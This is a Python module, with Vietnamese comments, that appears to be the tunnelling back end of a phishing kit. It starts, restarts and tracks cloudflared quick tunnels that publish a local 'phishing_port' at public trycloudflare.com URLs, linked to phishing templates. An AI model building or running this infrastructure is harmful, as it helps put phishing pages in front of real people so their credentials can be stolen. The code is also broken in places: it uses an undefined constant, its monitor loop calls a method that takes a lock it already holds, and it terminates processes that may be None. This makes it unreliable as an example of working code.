import subprocess
import threading
import time
import re
import os
import signal
from typing import List, Optional, Dict
from config import CLOUDFLARED_PATH, MAX_TUNNELS
from core.database import Database
from utils.sse_manager import SSEManager

class Tunnel:
    def __init__(self, id, url, local_port, process_pid, status, created_at, auto_stop_at=None,
                 restart_count=0, max_restarts=3, template_id=None):
        self.id = id
        self.url = url
        self.local_port = local_port
        self.process_pid = process_pid
        self.status = status
        self.created_at = created_at
        self.auto_stop_at = auto_stop_at
        self.restart_count = restart_count
        self.max_restarts = max_restarts
        self.template_id = template_id

class TunnelService:
    def __init__(self, db: Database, phishing_port: int):
        self.db = db
        self.phishing_port = phishing_port
        self.cloudflared = CLOUDFLARED_PATH
        self.active_processes: Dict[int, subprocess.Popen] = {}
        self.lock = threading.Lock()
        self._restore_tunnels()

    def _restore_tunnels(self):
        """Khôi phục các tunnel đang chạy từ DB (nếu process còn sống)."""
        rows = self.db.fetchall("SELECT * FROM tunnels WHERE status='running'")
        for row in rows:
            pid = row['process_pid']
            if pid and self._is_pid_alive(pid):
                # Khôi phục subprocess object (không thể attach, nhưng giữ PID để quản lý)
                self.active_processes[row['id']] = None  # Đánh dấu đang chạy, sẽ được giám sát sau
            else:
                self.db.execute("UPDATE tunnels SET status='error', last_error='Process not found on restore' WHERE id=?", (row['id'],))

    def _is_pid_alive(self, pid):
        try:
            os.kill(pid, 0)
            return True
        except:
            return False

    def _read_url(self, proc, timeout=15):
        start = time.time()
        while time.time() - start < timeout:
            line = proc.stdout.readline()
            if not line:
                time.sleep(0.1)
                continue
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                return match.group(0)
        return None

    def create(self, count: int = 1, auto_stop_minutes: int = 0, template_id: int = None) -> List[Tunnel]:
        created = []
        with self.lock:
            current = len(self.active_processes)
            if current + count > MAX_TUNNELS:
                raise ValueError(f"Đã đạt giới hạn {MAX_TUNNELS} tunnel")

            for _ in range(count):
                cmd = [self.cloudflared, "tunnel", "--url", f"http://127.0.0.1:{self.phishing_port}"]
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                url = self._read_url(proc)
                if url:
                    status = 'running'
                    error = None
                else:
                    status = 'error'
                    error = 'Không thể lấy URL từ cloudflared'

                auto_stop_at = None
                if auto_stop_minutes > 0:
                    auto_stop_at = time.time() + auto_stop_minutes * 60

                cur = self.db.execute(
                    "INSERT INTO tunnels (url, local_port, process_pid, status, auto_stop_at, template_id) VALUES (?,?,?,?,?,?)",
                    (url, self.phishing_port, proc.pid, status, auto_stop_at, template_id)
                )
                tunnel_id = cur.lastrowid
                self.active_processes[tunnel_id] = proc
                tunnel = Tunnel(
                    id=tunnel_id,
                    url=url,
                    local_port=self.phishing_port,
                    process_pid=proc.pid,
                    status=status,
                    created_at=time.time(),
                    auto_stop_at=auto_stop_at,
                    restart_count=0,
                    max_restarts=DEFAULT_TUNNEL_MAX_RESTARTS,
                    template_id=template_id
                )
                created.append(tunnel)

                # Emit event
                SSEManager.emit('tunnel_created', {
                    'id': tunnel.id,
                    'url': tunnel.url,
                    'status': tunnel.status,
                    'created_at': tunnel.created_at
                })

        return created

    def stop(self, tunnel_id: int) -> bool:
        with self.lock:
            proc = self.active_processes.pop(tunnel_id, None)
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except:
                    try:
                        os.kill(proc.pid, signal.SIGKILL)
                    except:
                        pass
            self.db.execute(
                "UPDATE tunnels SET status='stopped', stopped_at=CURRENT_TIMESTAMP WHERE id=?",
                (tunnel_id,)
            )
            SSEManager.emit('tunnel_stopped', {'id': tunnel_id})
            return True

    def stop_all(self):
        with self.lock:
            for tid, proc in list(self.active_processes.items()):
                try:
                    proc.terminate()
                except:
                    pass
                self.db.execute("UPDATE tunnels SET status='stopped', stopped_at=CURRENT_TIMESTAMP WHERE id=?", (tid,))
            self.active_processes.clear()
        SSEManager.emit('all_stopped', {})

    def get_all(self, status_filter: str = None) -> List[dict]:
        if status_filter:
            rows = self.db.fetchall("SELECT * FROM tunnels WHERE status=? ORDER BY created_at DESC", (status_filter,))
        else:
            rows = self.db.fetchall("SELECT * FROM tunnels ORDER BY created_at DESC")
        return [dict(row) for row in rows]

    def restart(self, tunnel_id: int) -> bool:
        with self.lock:
            row = self.db.fetchone("SELECT * FROM tunnels WHERE id=?", (tunnel_id,))
            if not row:
                return False
            # Dừng process cũ nếu còn
            proc = self.active_processes.pop(tunnel_id, None)
            if proc:
                try:
                    proc.terminate()
                except:
                    pass
            # Tạo lại
            cmd = [self.cloudflared, "tunnel", "--url", f"http://127.0.0.1:{self.phishing_port}"]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            url = self._read_url(proc)
            if url:
                self.db.execute("UPDATE tunnels SET url=?, process_pid=?, status='running', last_error=NULL WHERE id=?",
                                (url, proc.pid, tunnel_id))
                self.active_processes[tunnel_id] = proc
                SSEManager.emit('tunnel_restarted', {'id': tunnel_id, 'url': url})
                return True
            else:
                self.db.execute("UPDATE tunnels SET status='error', last_error='Restart failed' WHERE id=?", (tunnel_id,))
                return False

    def monitor(self):
        """Chạy trong thread riêng: kiểm tra tunnel, tự restart nếu cần."""
        while True:
            with self.lock:
                for tid, proc in list(self.active_processes.items()):
                    if proc is None:
                        continue
                    poll = proc.poll()
                    if poll is not None:  # đã kết thúc
                        row = self.db.fetchone("SELECT * FROM tunnels WHERE id=?", (tid,))
                        if row and row['status'] == 'running':
                            # Tăng restart count
                            new_count = row['restart_count'] + 1
                            if new_count <= row['max_restarts']:
                                # Tự động restart
                                self.restart(tid)
                                self.db.execute("UPDATE tunnels SET restart_count=? WHERE id=?", (new_count, tid))
                            else:
                                self.db.execute("UPDATE tunnels SET status='error', last_error='Max restarts reached' WHERE id=?", (tid,))
                                self.active_processes.pop(tid, None)
                                SSEManager.emit('tunnel_error', {'id': tid, 'error': 'Max restarts reached'})
            time.sleep(5)

    def cleanup_expired(self):
        """Dừng các tunnel đã hết hạn auto_stop."""
        now = time.time()
        rows = self.db.fetchall("SELECT id FROM tunnels WHERE status='running' AND auto_stop_at IS NOT NULL AND auto_stop_at <= ?", (now,))
        for row in rows:
            self.stop(row['id'])
